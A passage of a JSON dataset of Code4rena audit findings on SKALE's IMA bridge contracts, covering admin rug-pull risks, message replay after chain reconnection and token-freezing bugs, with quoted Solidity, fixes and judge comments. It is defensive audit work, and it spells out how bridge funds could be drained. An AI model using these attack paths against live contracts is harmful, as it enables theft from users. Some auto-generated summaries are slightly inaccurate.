      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract, which, if exploited, could potentially allow a malicious attacker to drain tokens from a locked account on the mainnet and trap the tokens of other users on the Schain. \n\nThe vulnerability is present in the code of the DepositBoxERC20 and ERC20OnChain contracts. In particular, the malicious attacker can exploit the minting function in ERC20OnChain to mint tokens equal to the amount stored in the transferredAmount variable in DepositBoxERC20. This will allow the attacker to drain the tokens from the locked account on the mainnet and trap the tokens of other users on the Schain. \n\nThe proof of concept for this vulnerability is as follows: the malicious attacker deploys an ERC20 clone on the Schain, and assigns the MINTER_ROLE to himself. He then waits for more users to deposit tokens on DepositBoxERC20, which will increase the amount in transferredAmount. The malicious attacker then mints to his own account the amount equal to transferredAmount on ERC20OnChain. He then calls exitToMainERC20 in TokenManagerERC20, which drains the tokens from the locked account on the mainnet and traps the tokens of other users on the Schain. \n\nThe recommended mitigation step for this vulnerability is to disable the minting function to be called directly in ERC20OnChain. Only allow minting when bridging tokens over.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/38",
      "tags": [],
      "finders": [
        "cccz",
        "kyliek"
      ]
    },
    {
      "id": "1605",
      "title": "[M-06] Centralisation risk: admin role of `TokenManagerEth` can rug pull all Eth from the bridge",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird_\n\nThere is a Centralisation risk of the bridge where the `DEFAULT_ADMIN_ROLE` of `TokenManagerEth.sol` is able to modify the ERC20 token on the SChain to any arbitrary address. This would allow the admin role to change the address to one where they have infinite supply, they could then call `exitToMain(amount)` equal to the balance of the DepositBox in the main Ethereum chain. After the message is process on the main Ethereum chain they will receive the entire Eth balance of that contract.\n\nThe rug pull attack occurs because there is a `DEFAULT_ADMIN_ROLE` which is set in the intiialisation to the `msg.sender` as seen in `initializeTokenManager()` below.\n\nThe `DEFAULT_ADMIN_ROLE` may then call `setEthErc20Address(IEthErc20 newEthErc20Address)`  setting `newEthErc20Address` to any arbitrary contract they control.\n\n### Proof of Concept\n\n        function setEthErc20Address(IEthErc20 newEthErc20Address) external override {\n            require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), \"Not authorized caller\");\n            require(ethErc20 != newEthErc20Address, \"Must be new address\");\n            ethErc20 = newEthErc20Address;\n        }\n\n<!---->\n\n        function initializeTokenManager(\n            string memory newSchainName,\n            IMessageProxyForSchain newMessageProxy,\n            ITokenManagerLinker newIMALinker,\n            ICommunityLocker newCommunityLocker,\n            address newDepositBox\n        )\n            public\n            virtual\n            initializer\n        {\n            require(newDepositBox != address(0), \"DepositBox address has to be set\");\n\n            AccessControlEnumerableUpgradeable.__AccessControlEnumerable_init();\n            _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n            _setupRole(AUTOMATIC_DEPLOY_ROLE, msg.sender);\n            _setupRole(TOKEN_REGISTRAR_ROLE, msg.sender);\n\n            schainHash = keccak256(abi.encodePacked(newSchainName));\n            messageProxy = newMessageProxy;\n            tokenManagerLinker = newIMALinker;\n            communityLocker = newCommunityLocker;        \n            depositBox = newDepositBox;\n\n            emit DepositBoxWasChanged(address(0), newDepositBox);\n        }\n\n### Recommended Mitigation Steps\n\nConsider removing the function `setEthErc20Address()` as `ethErc20` is set in the `initialize()` function and does not need to be changed.\n\n\n**[DimaStebaev (SKALE) disagreed with severity and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/35#issuecomment-1064199292):**\n > Acknowledged, and this can be done only by SKALE chain owner. \n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/35#issuecomment-1144015873):**\n > Agree that the admin has the ability to rug users and agree with Med Severity\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a Centralisation risk of the bridge where the `DEFAULT_ADMIN_ROLE` of `TokenManagerEth.sol` is able to modify the ERC20 token on the SChain to any arbitrary address. This would allow the admin role to change the address to one where they have infinite supply, they could then call `exitToMain(amount)` equal to the balance of the DepositBox in the main Ethereum chain. After the message is process on the main Ethereum chain they will receive the entire Eth balance of that contract. \n\nThe `DEFAULT_ADMIN_ROLE` is set in the intiialisation to the `msg.sender` as seen in `initializeTokenManager()` and may then call `setEthErc20Address(IEthErc20 newEthErc20Address)`  setting `newEthErc20Address` to any arbitrary contract they control. This would lead to a rug pull attack. \n\nThe recommended mitigation steps are to consider removing the function `setEthErc20Address()` as `ethErc20` is set in the `initialize()` function and does not need to be changed.",
      "quality_score": 3.000002467536473,
      "rarity_score": 1.000004935072947,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/35",
      "tags": [],
      "finders": [
        "kirk-baird"
      ]
    },
    {
      "id": "1604",
      "title": "[M-05] Schain owners can rug pull users' funds",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by gzeon and kirk-baird_\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L138-L142>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L196-L200>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L183-L187>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L261-L271>\n\n### Impact\n\nOnce a chain has been killed the chain owner is able to call `getFunds()` on each of the deposit boxes and transfer funds/tokens wherever he/she wishes\n\nEven if the owner is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960). See [this](https://github.com/code-423n4/2021-08-realitycards-findings/issues/73) example where a similar finding has been flagged as a high-severity issue. I've downgraded these instances to be a medium since it requires cooperation of the IMA mainnet admin.\n\n### Proof of Concept\n\n```solidity\n    function getFunds(string calldata schainName, address payable receiver, uint amount)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L138-L142>\n\n```solidity\n    function getFunds(string calldata schainName, address erc20OnMainnet, address receiver, uint amount)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L196-L200>\n\n```solidity\n    function getFunds(string calldata schainName, address erc721OnMainnet, address receiver, uint tokenId)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L183-L187>\n\n```solidity\n    function getFunds(\n        string calldata schainName,\n        address erc1155OnMainnet,\n        address receiver,\n        uint256[] memory ids,\n        uint256[] memory amounts\n    )\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L261-L271>\n\n### Recommended Mitigation Steps\n\nAdd a long time lock for killing so users have plenty of time to get their funds out before a kill\n\n\n**[DimaStebaev (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/71#issuecomment-1065153957):**\n > Acknowledged, and timelock & eventual removal has been added to the roadmap\n > This is not a vulnerability.\n> We explicitly added this functionality to prevent loosing of funds in case of technical problems with SKALE chain. It requires SKALE chain owner and SKALE foundation cooperation to run this mechanism.\n> It is going to be removed eventually after some time of stable work.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/71#issuecomment-1143867079):**\n > While I empathize with the sponsor's side that the function is meant as a security mechanism, it does allow the chainOwner to pull all funds and transfer them to their own wallet.\n> \n> Because this is contingent on Admin Privilege, I believe Medium Severity to be appropriate\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue found in the code of a project called IMA-C4-Audit. The project is hosted on Github and the lines of code causing the issue can be found in the link provided. The issue is that the chain owner is able to call â€˜getFunds()â€™ on each of the deposit boxes and transfer funds/tokens wherever they wish, even if they are benevolent. This could have a negative impact on the protocolâ€™s reputation. The bug report includes a proof of concept and the tools used to find the issue. The recommended mitigation steps are to add a long time lock for killing so users have plenty of time to get their funds out before a kill.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/71",
      "tags": [],
      "finders": [
        "IllIllI",
        "gzeon  kirk-baird"
      ]
    },
    {
      "id": "1603",
      "title": "[M-04] TokenManagerERC20.sol uses transferFrom() instead of safeTransferFrom()",
      "impact": "MEDIUM",
      "content": "_Submitted by jayjonah8, also found by cmichel and IllIllI_\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/TokenManagers/TokenManagerERC20.sol#L298>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/TokenManagers/TokenManagerERC20.sol#L303>\n\n### Impact\n\nIn TokenManagerERC20.sol the \\_exit() function makes use of transferFrom() instead of using safeTransferFrom().   Tokens that donâ€™t correctly implement the latest EIP20 spec will be unusable in the protocol as they revert the transaction because of the missing return value.\n\n### Proof of Concept\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/TokenManagers/TokenManagerERC20.sol#L298>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/TokenManagers/TokenManagerERC20.sol#L303>\n\n### Recommended Mitigation Steps\n\nIt's recommended to use OpenZeppelinâ€™s SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens.\n\n\n**[cstrangedk (SKALE) disputed, disagreed with severity and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/8#issuecomment-1058429459):**\n > Issue is acknowledged and work is pending on the roadmap. No loss of funds is possible, only revert txn. In the meantime, SKALE Chain owners at their discretion can expand the bridge compatibility to use safeTransfer functions. Owners must evaluate token compatibility.\n\n**[GalloDaSballo (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/8#issuecomment-1143815630):**\n > I believe that given the \"need for configuration\" the finding cannot be of High Severity. Additionally, the tx will revert as such no loss of funds is possible.\n> \n> The tokens that will cause a revert (e.g. USDT) will simply be unusable.\n> \n> While the argument for configuration is correct in de-escalating to Medium, I don't believe it exempts the code from being properly scrutinized.\n> \n> If a user were to configure their chain to use TokenManagerERC20 they'd have revert on non returning tokens, for that reason I believe Medium Severity to be appropriate as this is contingent on configuration\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the _exit() function of the TokenManagerERC20.sol code. The function makes use of transferFrom() instead of using safeTransferFrom(), which can cause transactions to revert if the token does not correctly implement the latest EIP20 spec. A proof of concept is provided in the report, and the bug was found through manual code review. The recommended mitigation step is to use OpenZeppelinâ€™s SafeERC20 versions with the safeTransfer and safeTransferFrom functions, which handle the return value check and are compatible with non-standard-compliant tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/8",
      "tags": [],
      "finders": [
        "jayjonah8",
        "cmichel  IllIllI"
      ]
    },
    {
      "id": "1602",
      "title": "[M-03] S2S Transfer from the origin schain to another schain with automatic deploy disabled can cause funds to be frozen",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nWhen moving tokens that are native on the origin schain, to another schain, `TokenManagerERC20.sol#transferToSchainERC20()` will be called, which calls `_exit()` -> `_receiveERC20()`:\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L289-L301>\n\n```solidity\nif (isMainChainToken) {\n    data = _receiveERC20(\n        chainHash,\n        address(contractOnSchain),\n        msg.sender,\n        amount\n    );\n    _saveTransferredAmount(chainHash, address(contractOnSchain), amount);\n    require(\n        contractOnSchain.transferFrom(msg.sender, address(this), amount),\n        \"Transfer was failed\"\n    );\n}\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L351-L361>\n\n```solidity\nbool isERC20AddedToSchain = _schainToERC20[chainHash].contains(erc20OnMainChain);\nif (!isERC20AddedToSchain) {\n    _addERC20ForSchain(chainHash, erc20OnMainChain);\n    data = Messages.encodeTransferErc20AndTokenInfoMessage(\n        erc20OnMainChain,\n        to,\n        amount,\n        _getErc20TotalSupply(erc20),\n        _getErc20TokenInfo(erc20)\n    );\n}\n```\n\nHowever, on the target schain, while handling the inbound message with `postMessage()` -> `_sendERC20()`, when `contractOnSchain` is `false`, The transaction will fail with `\"Automatic deploy is disabled\"` when `automaticDeploy == false`:\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L227-L235>\n\n```solidity\n contractOnSchain = clonesErc20[fromChainHash][token];\n\nif (address(contractOnSchain) == address(0)) {\n    require(automaticDeploy, \"Automatic deploy is disabled\");\n    contractOnSchain = new ERC20OnChain(message.tokenInfo.name, message.tokenInfo.symbol);\n    clonesErc20[fromChainHash][token] = contractOnSchain;\n    addedClones[contractOnSchain] = true;\n    emit ERC20TokenCreated(fromChainHash, token, address(contractOnSchain));\n}\n```\n\nAs a result, any tokens that are locked in the origin schain by the user will be frozen in the contract.\n\n### Recommendation\n\nConsider adding a `mapping` storage to cache whether `automaticDeploy` is enabled on a certain schain, the cache should be updated once the `automaticDeploy` is updated.\n\nAnd only allows S2S transfer when `automaticDeploy` is enabled on the target schain.\n\nTo further avoid the edge case of: right after the user submitted the S2S transfer tx on the from schain, the target schain disabled `automaticDeploy` and the user's tokens can be frozen in the from schain. We can introduce a 24 hrs timelock for disabling `automaticDeploy`.\n\n**[cstrangedk (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/59#issuecomment-1061273352):**\n> Issue raised is acknowledged and work is assigned on the roadmap.  SKALE Chain owners must ensure any mapped assets, either through manual or automatic mapping are compatible with their dApp(s). Manual mapping mode is the default mode for bridge operation. \n\n\n**[GalloDaSballo (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/59#issuecomment-1143799500):**\n > I agree with both sides of the argument, and because this is contingent on configuration and admin privilege, believe Medium Severity to be more appropriate\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the TokenManagerERC20.sol contract which is part of the SKALE Network's IMA-C4-Audit project. The bug affects the transfer of tokens from one schain to another schain. When `TokenManagerERC20.sol#transferToSchainERC20()` is called, it calls `_exit()` which then calls `_receiveERC20()`. This determines if the token is a main chain token and if so, it attempts to transfer the token from the sender to the contract on the schain. However, on the target schain, when `postMessage()` is called and `contractOnSchain` is `false`, the transaction will fail with the error \"Automatic deploy is disabled\" when `automaticDeploy == false`. As a result, the user's tokens can be frozen in the originating schain.\n\nTo address this issue, the SKALE Network recommends adding a mapping storage to cache whether `automaticDeploy` is enabled on a certain schain, and updating the cache whenever `automaticDeploy` is updated. Additionally, S2S transfer should only be allowed when `automaticDeploy` is enabled on the target schain. Finally, to avoid the edge case of the user's tokens becoming frozen in the originating schain, a 24 hour timelock should be implemented for disabling `automaticDeploy`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/59",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1601",
      "title": "[M-02] When transferring tokens native on SKALE to Ethereum with `TokenManagerERC20.exitToMainERC20()`, the tokens on the schain will be frozen on `TokenManagerERC20`, but they will not receive tokens on Ethereum",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nIn the current implementation of `TokenManagerERC20`, it allows `exitToMainERC20(tokenOnSchain, amount)`.\n\nAt L277 of `TokenManagerERC20.sol` in `exitToMainERC20()`, if `tokenOnSchain` is minted on SKALE schain natively, there are no such require statement that prevents the target chain being mainnet, eg: `require(chainHash != MAINNET_HASH, \"...\")`\n\nTherefore, a user can set mainnet as the target chain, and at L298 of `TokenManagerERC20.sol`, the tokens will be transferred to the contract, and at L308,  send message to Ethereum mainnet.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L95-L104>\n\n```solidity\n    function exitToMainERC20(\n        address contractOnMainnet,\n        uint256 amount\n    )\n        external\n        override\n    {\n        communityLocker.checkAllowedToSendMessage(msg.sender);\n        _exit(MAINNET_HASH, depositBox, contractOnMainnet, msg.sender, amount);\n    }\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L264-L313>\n\n```solidity\n    function _exit(\n        bytes32 chainHash,\n        address messageReceiver,\n        address contractOnMainChain,\n        address to,\n        uint256 amount\n    )\n        private\n    {\n        bool isMainChainToken;\n        ERC20BurnableUpgradeable contractOnSchain = clonesErc20[chainHash][contractOnMainChain];\n        if (address(contractOnSchain) == address(0)) {\n            contractOnSchain = ERC20BurnableUpgradeable(contractOnMainChain);\n            isMainChainToken = true;\n        }\n        require(address(contractOnSchain).isContract(), \"No token clone on schain\");\n        require(contractOnSchain.balanceOf(msg.sender) >= amount, \"Insufficient funds\");\n        require(\n            contractOnSchain.allowance(\n                msg.sender,\n                address(this)\n            ) >= amount,\n            \"Transfer is not approved by token holder\"\n        );\n        bytes memory data = Messages.encodeTransferErc20Message(address(contractOnMainChain), to, amount);\n        if (isMainChainToken) {\n            data = _receiveERC20(\n                chainHash,\n                address(contractOnSchain),\n                msg.sender,\n                amount\n            );\n            _saveTransferredAmount(chainHash, address(contractOnSchain), amount);\n            require(\n                contractOnSchain.transferFrom(msg.sender, address(this), amount),\n                \"Transfer was failed\"\n            );\n        } else {\n            require(\n                contractOnSchain.transferFrom(msg.sender, address(this), amount),\n                \"Transfer was failed\"\n            );\n            contractOnSchain.burn(amount);\n        }\n        messageProxy.postOutgoingMessage(\n            chainHash,\n            messageReceiver,\n            data\n        );\n    }\n```\n\nHowever, the `DepositBoxERC20` contract on Ethereum mainnet does not support such message from `TokenManagerERC20` on the schain:\n\nThe type of the message from schain `TokenManagerERC20` is `TRANSFER_ERC20_AND_TOKEN_INFO` (see L354 of TokenManagerERC20.sol) or `TRANSFER_ERC20_AND_TOTAL_SUPPLY` (see L362 of TokenManagerERC20.sol).\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L339-L370>\n\n```solidity\n    function _receiveERC20(\n        bytes32 chainHash,\n        address erc20OnMainChain,\n        address to,\n        uint256 amount\n    )\n        private\n        returns (bytes memory data)\n    {\n        ERC20BurnableUpgradeable erc20 = ERC20BurnableUpgradeable(erc20OnMainChain);\n        uint256 totalSupply = erc20.totalSupply();\n        require(amount <= totalSupply, \"Amount is incorrect\");\n        bool isERC20AddedToSchain = _schainToERC20[chainHash].contains(erc20OnMainChain);\n        if (!isERC20AddedToSchain) {\n            _addERC20ForSchain(chainHash, erc20OnMainChain);\n            data = Messages.encodeTransferErc20AndTokenInfoMessage(\n                erc20OnMainChain,\n                to,\n                amount,\n                _getErc20TotalSupply(erc20),\n                _getErc20TokenInfo(erc20)\n            );\n        } else {\n            data = Messages.encodeTransferErc20AndTotalSupplyMessage(\n                erc20OnMainChain,\n                to,\n                amount,\n                _getErc20TotalSupply(erc20)\n            );\n        }\n        emit ERC20TokenReady(chainHash, erc20OnMainChain, amount);\n    }\n```\n\n`DepositBoxERC20` on Ethereum MAINNET can only process `TRANSFER_ERC20`. (see DepositBoxERC20.sol L155 and Messages.sol L270)\n\nWhen getting a message with the type of `TRANSFER_ERC20_AND_TOKEN_INFO` or `TRANSFER_ERC20_AND_TOTAL_SUPPLY` from schain `TokenManagerERC20`, it will revert at L270 of Messages.sol.\n\nAs a result, the schain tokens will be frozen on TokenManagerERC20, but they will not receive tokens on Ethereum.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L143-L164>\n\n```solidity\n    function postMessage(\n        bytes32 schainHash,\n        address sender,\n        bytes calldata data\n    )\n        external\n        override\n        onlyMessageProxy\n        whenNotKilled(schainHash)\n        checkReceiverChain(schainHash, sender)\n        returns (address)\n    {\n        Messages.TransferErc20Message memory message = Messages.decodeTransferErc20Message(data);\n        require(message.token.isContract(), \"Given address is not a contract\");\n        require(ERC20Upgradeable(message.token).balanceOf(address(this)) >= message.amount, \"Not enough money\");\n        _removeTransferredAmount(schainHash, message.token, message.amount);\n        require(\n            ERC20Upgradeable(message.token).transfer(message.receiver, message.amount),\n            \"Transfer was failed\"\n        );\n        return message.receiver;\n    }\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L267-L272>\n\n```solidity\n    function decodeTransferErc20Message(\n        bytes calldata data\n    ) internal pure returns (TransferErc20Message memory) {\n        require(getMessageType(data) == MessageType.TRANSFER_ERC20, \"Message type is not ERC20 transfer\");\n        return abi.decode(data, (TransferErc20Message));\n    }\n```\n\n### Recommendation\n\nConsider preventing moving schain native tokens to Ethereum MAINNET, for example: Add `require(chainHash != MAINNET_HASH, \"...\")` near L277 of TokenManagerERC20.sol.\n\n\n**[cstrangedk (SKALE) disagreed with severity and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/58#issuecomment-1061027228):**\n > Valid issue, however disagree with severity as issue relates to `function incorrect as to spec`.  Suggest `low severity`.\n\n**[GalloDaSballo (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/58#issuecomment-1143798216):**\n > Let me reason through the finding:\n> -> The warden has shown a way for funds to be lost as long as a user uses a sChainNativeToken and burns them to bridge to mainnet (Potentially High)\n> \n> -> This is contingent on the configuration of the depositBoxErc20 (Potentially Med)\n> \n> I disagree with the sponsor argument in that while the code may not be as to spec, the functionality impaired as a medium to high impact.\n> \n> At this time I can rationalize the severity either as:\n> -> It should be High because the given codebase \"default\" functionality has this flaw\n> -> it should be Med because this is contingent on a configuration parameter\n> \n> Given the pre-context that the sChain could be set up by the admin to allow the misconfiguration to happen, at this time, I believe Medium Severity to be more appropriate as the impact is solely dependent upon the configuration of the chain which as explained in the readmes is mostly dependent on the admin.\n\n**[cstrangedk (SKALE) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/58#issuecomment-1195585103):**\n > Mitigated in [skalenetwork/IMA#1031](https://github.com/skalenetwork/IMA/pull/1031).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the current implementation of the `TokenManagerERC20` contract, which allows users to move schain native tokens to Ethereum mainnet. At Line 277 of the `TokenManagerERC20.sol` contract, there is no such require statement that prevents the target chain being mainnet, which allows a user to set mainnet as the target chain and transfer the tokens to the contract. At Line 298, the tokens will be sent to the Ethereum mainnet, but the `DepositBoxERC20` contract on Ethereum mainnet does not support such message from the `TokenManagerERC20` on the schain. As a result, the schain tokens will be frozen on TokenManagerERC20, but they will not receive tokens on Ethereum.\n\nThe recommendation given is to consider preventing moving schain native tokens to Ethereum MAINNET by adding `require(chainHash != MAINNET_HASH, \"...\")` near Line 277 of TokenManagerERC20.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/58",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1600",
      "title": "[M-01] Transactions can be replayed when a connectedChain is removed and then reconnected",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by cmichel_\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L313-L317>\n\n```solidity\nfunction removeConnectedChain(string memory schainName) public virtual override onlyChainConnector {\n    bytes32 schainHash = keccak256(abi.encodePacked(schainName));\n    require(connectedChains[schainHash].inited, \"Chain is not initialized\");\n    delete connectedChains[schainHash];\n}\n```\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L402-L409>\n\n```solidity\nfunction _addConnectedChain(bytes32 schainHash) internal onlyChainConnector {\n    require(!connectedChains[schainHash].inited,\"Chain is already connected\");\n    connectedChains[schainHash] = ConnectedChainInfo({\n        incomingMessageCounter: 0,\n        outgoingMessageCounter: 0,\n        inited: true\n    });\n}\n```\n\nIn the current implementation, when a connected chain is removed, the `incomingMessageCounter` and `outgoingMessageCounter` will be deleted.\n\nAnd if it's reconnected again, the `incomingMessageCounter` and `outgoingMessageCounter` will be reset to `0`.\n\nHowever, since the contract is using `connectedChains[fromChainHash].incomingMessageCounter` and `signature` to ensure that the message can only be processed once.\n\n### Impact\n\n1.  Once the `incomingMessageCounter` resets to `0`, all the past messages (transactions) can be replayed with the old signatures.\n\n2.  Another impact is that, for the particular reconnected schain, both inbound and outbound messages may not be able to be processed properly, as the counter is now out of sync with the remote schain.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L212-L221>\n\n```solidity\nrequire(\n    _verifyMessages(\n        _hashedArray(messages, startingCounter, fromChainName),\n        signature\n    ),\n    \"Signature is not verified\"\n);\nrequire(\n    startingCounter == connectedChains[fromChainHash].incomingMessageCounter,\n    \"Starting counter is not qual to incoming message counter\");\n```\n\n### Recommendation\n\nWhen removing and connecting a schain, instead of delete/reset the couter, consider leaving the counter as it is when `removeConnectedChain`, `_addConnectedChain` also should not reset the counter:\n\n```solidity\nfunction removeConnectedChain(string memory schainName) public virtual override onlyChainConnector {\n    bytes32 schainHash = keccak256(abi.encodePacked(schainName));\n    require(connectedChains[schainHash].inited, \"Chain is not initialized\");\n    connectedChains[targetChainHash].inited = false;\n}\n```\n\n```solidity\nfunction _addConnectedChain(bytes32 schainHash) internal onlyChainConnector {\n    require(!connectedChains[schainHash].inited,\"Chain is already connected\");\n    connectedChains[schainHash].inited = true;\n}\n```\n**[DimaStebaev (SKALE) disagreed with severity and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/57#issuecomment-1064177348):**\n> Acknowledged, and work is on the roadmap.\n\n**[GalloDaSballo (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/57#issuecomment-1143788390):**\n > I believe the finding to have validity, in that, a set of signed messages can be replayed if the chain is disconnected and then re-connected while maintaining the same validators.\n> \n> At this time I think Medium Severity (External Conditions Reliance) to be more appropriate and that the issue can be fully sidestepped by changing validators on a chain reconnect\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the MessageProxy contract of the SKALE Network. The issue is that when a connected chain is removed and then reconnected, the `incomingMessageCounter` and `outgoingMessageCounter` will be reset to zero. This can lead to two impacts. Firstly, all past messages can be replayed with the old signatures. Secondly, both inbound and outbound messages may not be able to be processed properly, as the counter is now out of sync with the remote schain. \n\nThe recommendation is that when removing and connecting a schain, instead of delete/reset the counter, consider leaving the counter as it is. The `removeConnectedChain` and `_addConnectedChain` should not reset the counter. This would ensure that the counter is not reset and the messages can be processed properly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/57",
      "tags": [],
      "finders": [
        "WatchPug",
        "cmichel"
      ]
    },
    {
      "id": "1599",
      "title": "[H-02] Gas pricing can be used to extort funds from users of SChain owner",
      "impact": "HIGH",
